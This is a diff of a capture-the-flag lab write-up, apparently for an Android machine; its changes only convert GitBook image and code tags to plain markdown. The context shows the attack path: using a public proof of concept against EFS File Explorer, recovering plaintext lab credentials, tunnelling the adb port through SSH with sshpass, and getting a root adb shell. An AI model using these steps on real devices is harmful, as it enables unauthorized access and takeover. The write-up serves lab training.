@@ -148,11 +148,11 @@ Port 59777 seems to be returning some stuff.
 
 The other ports weren't returning anything interesting. When we visit port 59777, it returns a short response.
 
-<figure><img src="../../../.gitbook/assets/image (3995).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3995).png>)
 
 A quick Google search reveals that this is running EFS File Explorer, and also some CVEs:
 
-<figure><img src="../../../.gitbook/assets/image (1804).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1804).png>)
 
 I used the `poc.py` from this repo to send requests to the port and list the files present:
 
@@ -239,11 +239,11 @@ $ display creds.jpg
 
 The picture contains credentials for the user:
 
-<figure><img src="../../../.gitbook/assets/image (1645).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1645).png>)
 
 Here are the creds: `kristi:Kr1sT!5h@Rp3xPl0r3!`.
 
-<figure><img src="../../../.gitbook/assets/image (2078).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2078).png>)
 
 Great! There was no `/home` within this machine, and I just went to the directory where the pictures were stored:
 
@@ -264,15 +264,12 @@ Earlier, we found port 5555 on the machine and it was being filtered. Based on H
 
 To interact with this, we would first need to do port forwarding via `ssh`.
 
-{% code overflow="wrap" %}
 ```
 $ sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh -oHostKeyAlgorithms=+ssh-rsa -L 5555:127.0.0.1:5555 -p 2222 kristi@10.129.98.58
 ```
-{% endcode %}
 
 Then, we can use `adb` to interact with it:
 
-{% code overflow="wrap" %}
 ```
 $ adb connect localhost                                                       
 * daemon not running; starting now at tcp:5037
@@ -284,7 +281,6 @@ $ adb shell
 x86_64:/ # id                                                                               
 uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:su:s0
 ```
-{% endcode %}
 
 We are now root! We just need to find `root.txt` now.
 
